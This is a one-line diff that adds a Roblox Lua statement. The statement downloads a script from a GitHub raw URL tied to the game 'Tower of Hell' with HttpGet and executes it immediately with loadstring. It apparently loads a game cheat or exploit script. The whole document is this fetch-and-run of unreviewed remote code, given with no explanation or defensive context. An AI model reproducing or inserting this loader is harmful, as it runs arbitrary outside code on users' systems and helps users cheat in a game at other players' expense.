@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MinionRoblox/Tower-of-Hell/main/Scripts%20from%20Minion"))()
